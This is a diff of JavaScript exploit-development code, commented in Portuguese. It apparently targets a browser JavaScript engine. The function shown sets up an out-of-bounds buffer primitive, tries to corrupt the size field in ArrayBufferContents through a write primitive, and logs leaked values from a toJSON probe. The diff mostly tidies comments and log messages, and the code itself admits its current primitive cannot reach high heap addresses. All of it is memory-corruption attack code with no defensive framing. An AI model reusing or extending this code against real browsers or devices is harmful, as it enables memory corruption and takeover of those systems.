@@ -104,7 +104,7 @@ export function toJSON_AttemptWriteToThis_v3() {
     return result_payload;
 }
 
-
+// Função principal do teste de corrupção de ArrayBufferContents (mantida neste arquivo)
 export async function executeCorruptArrayBufferContentsSizeTest() {
     const FNAME_TEST = "executeCorruptABContentsSizeTest";
     logS3(`--- Iniciando Teste: Corromper Tamanho em ArrayBufferContents ---`, "test", FNAME_TEST);
@@ -142,23 +142,20 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
         logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
         return { errorOccurred: new Error("OOB Setup Failed"), stringifyResult: null, potentiallyCrashed: false };
     }
-
-    // **NOVA ETAPA: Forçar inicialização do oob_array_buffer_real**
+    
     logS3("Forçando inicialização completa do oob_array_buffer_real antes de ler m_impl...", "info", FNAME_TEST);
     try {
-        if (oob_array_buffer_real.byteLength > 0) { // Só tentar se o buffer tem tamanho
+        if (oob_array_buffer_real.byteLength > 0) {
             const temp_dv = new DataView(oob_array_buffer_real);
-            temp_dv.setUint8(0, 0x01); // Escreve um byte no início do buffer de dados real
+            temp_dv.setUint8(0, 0x01); 
             logS3("   Escrita de um byte no oob_array_buffer_real (via DataView) para forçar inicialização, realizada.", "good", FNAME_TEST);
         } else {
             logS3("   oob_array_buffer_real tem tamanho 0, pulando escrita de inicialização.", "warn", FNAME_TEST);
         }
     } catch (e_init) {
         logS3(`   ERRO ao tentar forçar inicialização do oob_array_buffer_real: ${e_init.message}`, "error", FNAME_TEST);
-        // Não abortar, tentar ler o ponteiro mesmo assim.
     }
-    await PAUSE_S3(SHORT_PAUSE_S3); // Pausa após a tentativa de inicialização
-
+    await PAUSE_S3(SHORT_PAUSE_S3);
 
     const initial_oob_ab_real_byteLength = oob_array_buffer_real.byteLength;
     logS3(`Tamanho inicial de oob_array_buffer_real (após tentativa de init): ${initial_oob_ab_real_byteLength} bytes`, "info", FNAME_TEST);
@@ -191,10 +188,7 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
              logS3(`   Escrita OOB de novo tamanho realizada (assumindo endereço relativo).`, "info", FNAME_TEST);
         } else {
              const msg = `Endereço do campo de tamanho ${target_size_field_address_obj.toString(true)} é um ponteiro de HEAP ALTO. ` +
-                         `A primitiva oob_write_absolute atual (relativa a oob_array_buffer_real) NÃO pode atingi-lo. ` +
-                         `Para este teste prosseguir e ter chance de sucesso na corrupção de ArrayBufferContents, ` +
-                         `seria necessária uma primitiva de escrita em endereço de memória absoluto, ou que m_impl e seu ` +
-                         `conteúdo estivessem dentro do alcance de oob_array_buffer_real.`;
+                         `A primitiva oob_write_absolute atual (relativa a oob_array_buffer_real) NÃO pode atingi-lo.`;
              logS3(msg, "error", FNAME_TEST);
              corruption_step_error = new Error(msg);
         }
@@ -243,7 +237,7 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
     if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_AttemptWriteToThis_v3") {
         logS3(`   Resultado da Sondagem via toJSON:`, "leak", FNAME_TEST);
         logS3(`     this_byteLength_prop: ${stringifyResult.this_byteLength_prop}`, "leak", FNAME_TEST);
-        logS3(`     oob_read_attempt_val: ${stringifyResult.oob_read_value_attempted}`, "leak", FNAME_TEST);
+        logS3(`     oob_read_value_attempted: ${stringifyResult.oob_read_value_attempted}`, "leak", FNAME_TEST);
         if (stringifyResult.error_in_toJSON) {
             logS3(`     ERRO DENTRO da toJSON: ${stringifyResult.error_in_toJSON}`, "warn", FNAME_TEST);
         }
